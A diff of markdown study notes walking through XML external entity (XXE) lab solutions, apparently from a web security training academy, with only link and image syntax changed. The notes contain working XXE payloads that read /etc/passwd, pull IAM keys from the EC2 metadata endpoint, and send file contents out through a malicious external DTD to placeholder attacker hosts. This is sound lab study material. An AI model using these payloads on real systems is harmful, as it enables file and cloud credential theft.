@@ -1,4 +1,4 @@
-## Stage 3
+### Stage 3
 ### What is it?
 XML external entity injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem. Can leverage XXE to perform server-side request forgery (SSRF) attacks. *It's possible to find XXE in requests that do not contain XML*.
 
@@ -13,7 +13,7 @@ Try the payload below to test for XXE
 ```
 %26entity;
 ```
-![XXE-20260222113339962](XXE-20260222113339962.png)
+![[XXE-20260222113339962.png]]
 
 
 - XML in `POST /product/stock`
@@ -23,23 +23,23 @@ Try the payload below to test for XXE
 ```
 - -
 	- Show `/etc/passwd` content
-		- <sup>Scan result: YES</sup> [XXE](XXE.md#3.1.%20Lab%20Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files%20%E2%AD%95%EF%B8%8F)
-		- <sup>Scan result: YES</sup>[XXE](XXE.md#3.2.%20Lab%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks%20%E2%AD%95%EF%B8%8F)
+		- <sup>Scan result: YES</sup> [[XXE#3.1. Lab Exploiting XXE using external entities to retrieve files ⭕️]]
+		- <sup>Scan result: YES</sup>[[XXE#3.2. Lab Exploiting XXE to perform SSRF attacks ⭕️]]
 	- "Invalid product ID"
-		- <sup>Scan result: YES</sup>[XXE](XXE.md#3.3.%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
+		- <sup>Scan result: YES</sup>[[XXE#3.3. Lab Blind XXE with out-of-band interaction ⭕️]]
 	- "Entities are not allowed for security reasons"
-		- [XXE](XXE.md#3.4.%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities%20%E2%AD%95%EF%B8%8F)
+		- [[XXE#3.4. Lab Blind XXE with out-of-band interaction via XML parameter entities ⭕️]]
 - **No** XML in `POST /product/stock`
-	- <sup>Scan result: YES</sup>[XXE](XXE.md#3.7.%20Lab%20Exploiting%20XInclude%20to%20retrieve%20files%20%E2%AD%95%EF%B8%8F)
+	- <sup>Scan result: YES</sup>[[XXE#3.7. Lab Exploiting XInclude to retrieve files ⭕️]]
 
 - XML in `POST /product/stock`
 	- *Use payload above* = "Entities are not allowed for security reasons"
-		- [XXE](XXE.md#3.5.%20Lab%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD%20%E2%AD%95%EF%B8%8F)
-		- [XXE](XXE.md#3.6.%20Lab%20Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages%20%E2%AD%95%EF%B8%8F)
+		- [[XXE#3.5. Lab Exploiting blind XXE to exfiltrate data using a malicious external DTD ⭕️]]
+		- [[XXE#3.6. Lab Exploiting blind XXE to retrieve data via error messages ⭕️]]
 
 - `svg` in `<img>` tag + image upload feature
-	-  ![XXE-20260113215511900](XXE-20260113215511900.png)
-	- [XXE](XXE.md#3.8.%20Lab%20Exploiting%20XXE%20via%20image%20file%20upload%20%E2%AD%95%EF%B8%8F)
+	-  ![[XXE-20260113215511900.png]]
+	- [[XXE#3.8. Lab Exploiting XXE via image file upload ⭕️]]
 
 
 
@@ -76,14 +76,14 @@ This lab has a "Check stock" feature that parses XML input and returns any unexp
 To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.
 1. Click on an item > Check stock > notice the request body uses XML.
 2. Set up the request with the payload like in the screenshot > Send > solve.
-![613](XXE-20260113202827930.png)
+![[XXE-20260113202827930.png|613]]
 ```
 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId>
 ```
 ##### Automated Method
 1. Send the XML request to Intruder > add the values as positions > Start attack
-	1. ![XXE-20260113202625302](XXE-20260113202625302.png)
-	2. ![XXE-20260113202603493](XXE-20260113202603493.png)
+	1. ![[XXE-20260113202625302.png]]
+	2. ![[XXE-20260113202603493.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. XML in the request body
 >2. Or Burp scan
@@ -102,14 +102,14 @@ The lab server is running a (simulated) EC2 metadata endpoint at the default URL
 
 To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.
 1. Select an item > Check stock > notice XML in the `POST /product/stock` request > Send to Repeater.
-	1. ![XXE-20260113203208349](XXE-20260113203208349.png)
+	1. ![[XXE-20260113203208349.png]]
 2. *Optional but recommended*: Use Burp scan -- scan insertion point
-	1. ![XXE-20260113203320106](XXE-20260113203320106.png)
+	1. ![[XXE-20260113203320106.png]]
 3. Paste in `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>` and add `&xxe;` in `productId`. Notice the error: **Invalid product ID: latest**. `latest` is a directory.
-	1. ![XXE-20260113203457706](XXE-20260113203457706.png)
+	1. ![[XXE-20260113203457706.png]]
 4. Add `latest` in the request and now we see `meta-data`. Keep traversing until you find the secret access key.
-	1. ![XXE-20260113203743267](XXE-20260113203743267.png)
-	2. ![XXE-20260113203834377](XXE-20260113203834377.png)
+	1. ![[XXE-20260113203743267.png]]
+	2. ![[XXE-20260113203834377.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. XML in the request body or Burp scan
 >2. Response says something like `Invalid product ID: latest` and `latest` is a directory
@@ -123,9 +123,9 @@ You can detect the blind XXE vulnerability by triggering out-of-band interaction
 To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
 1. Click item > Check stock > `POST /product/stock` > notice XML > send to Repeater.
 2. Insert `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>` and add `&xxe;`.
-	1. ![XXE-20260113204403326](XXE-20260113204403326.png)
+	1. ![[XXE-20260113204403326.png]]
 3. Poll Collaborator and solved.
-	1. ![XXE-20260113204427344](XXE-20260113204427344.png)
+	1. ![[XXE-20260113204427344.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. XML in the request body or Burp scan
 
@@ -136,9 +136,9 @@ This lab has a "Check stock" feature that parses XML input, but does not display
 To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
 1. Click item > Check stock > `POST /product/stock` > notice XML > send to Repeater.
 2. If you try the same solution in the previous lab (Step 2), you will get a different error and nothing will show up in Collaborator. Error: **"Entities are not allowed for security reasons"**.
-	1. ![XXE-20260113205110413](XXE-20260113205110413.png)
+	1. ![[XXE-20260113205110413.png]]
 3. Use *Parameter Entities* to bypass this. Send the payload below and solve. Notice the `% xxe` and `%xxe;` at the end.
-	1. ![XXE-20260113205557813](XXE-20260113205557813.png)
+	1. ![[XXE-20260113205557813.png]]
 ```
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
 ```
@@ -166,12 +166,12 @@ To solve the lab, exfiltrate the contents of the `/etc/hostname` file.
 %exfil;
 ```
 3. Repeater > enter the payload below (ensure it's the exploit server url even with `https://` and `/exploit`). Send.
-	1. ![XXE-20260113212848736](XXE-20260113212848736.png)
+	1. ![[XXE-20260113212848736.png]]
 ```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "EXPLOIT-SERVER-FULL-URL"> %xxe;]>
 ```
 4. Check Collaborator > HTTP request > and got the value of `file:///etc/hostname`. 
-	1. ![XXE-20260113212931089](XXE-20260113212931089.png)
+	1. ![[XXE-20260113212931089.png]]
 
 >If your exploit server full url has `/exploit.dtd` you have to reference it here: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD-URL"> %xxe;]>`
 
@@ -194,7 +194,7 @@ To solve the lab, exfiltrate the contents of the `/etc/hostname` file.
 </users>
 ```
 
-![Pasted image 20260222114111](Pasted%20image%2020260222114111.png)
+![[Pasted image 20260222114111.png]]
 
 >[!tip] How to Identify this Vulnerability?
 >1. XML in the request body
@@ -210,7 +210,7 @@ To solve the lab, use an external DTD to trigger an error message that displays 
 The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
 1. Click item > Check stock > `POST /product/stock` > notice XML > send to Repeater.
 2. If we try exactly what we did in Lab 5 but replace the payload to get `/etc/passwd` we'll get this error: "XML parser exited with error: java.net.MalformedURLException: Illegal character in URL".
-	1. ![XXE-20260113213745361](XXE-20260113213745361.png)
+	1. ![[XXE-20260113213745361.png]]
 3. Enter this in the exploit server and Store. This is the crucial part: **`'file:///invalid/%file;'>">`**.
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -221,7 +221,7 @@ The lab contains a link to an exploit server on a different domain where you can
 4. Enter this in Repeater: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit"> %xxe;]>`. Replace it with your exploit server URL. Send and solve.
 	1. **Exploit server: File should be /exploit**
 		1. If /exploit doesn't work change to /exploit.dtd. Make sure to change the payload in step 3 to /exploit.dtd too.
-	2. ![XXE-20260113214453965](XXE-20260113214453965.png)
+	2. ![[XXE-20260113214453965.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. XML in the request body
 >2. Able to get an out-of-band connection == got DNS + HTTP requests to Collaborator
@@ -237,10 +237,10 @@ Because you don't control the entire XML document you can't define a DTD to laun
 To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.
 1. Click item > Check stock > `POST /product/stock` > notice *NO* XML > send to Repeater.
 2. Send to Intruder > add positions to both product and store values > Scan insertion points and we get an XML Injection finding.
-	1. ![XXE-20260113214830294](XXE-20260113214830294.png)
-	2. ![XXE-20260113214822301](XXE-20260113214822301.png)
+	1. ![[XXE-20260113214830294.png]]
+	2. ![[XXE-20260113214822301.png]]
 3. Enter the below payload in the productId param, URL encode key characters, Send and solve.
-	1. ![XXE-20260113215107940](XXE-20260113215107940.png)
+	1. ![[XXE-20260113215107940.png]]
 ```
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
@@ -259,16 +259,16 @@ To solve the lab, inject an `XInclude` statement to retrieve the contents of t
 This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
 To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
 1. Click on a blog post > View Page Source > identify the image extension: `svg`
-	1. ![XXE-20260113215511900](XXE-20260113215511900.png)
+	1. ![[XXE-20260113215511900.png]]
 2. Upload a random `svg` file and post comment (it might not work but we just want the `POST` request then send it to Repeater).
 3. Replace the contents with this payload and Send.
 ```
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 ```
-![Pasted image 20260222115523](Pasted%20image%2020260222115523.png)
+![[Pasted image 20260222115523.png]]
 4. The avatar image was uploaded and the comment was posted. View image in new tab and the contents on `/etc/hostname` is in there. Submit and solve.
-	1. ![XXE-20260113220038408](XXE-20260113220038408.png)
-	2. ![XXE-20260113220053081](XXE-20260113220053081.png)
+	1. ![[XXE-20260113220038408.png]]
+	2. ![[XXE-20260113220053081.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. File upload feature
 
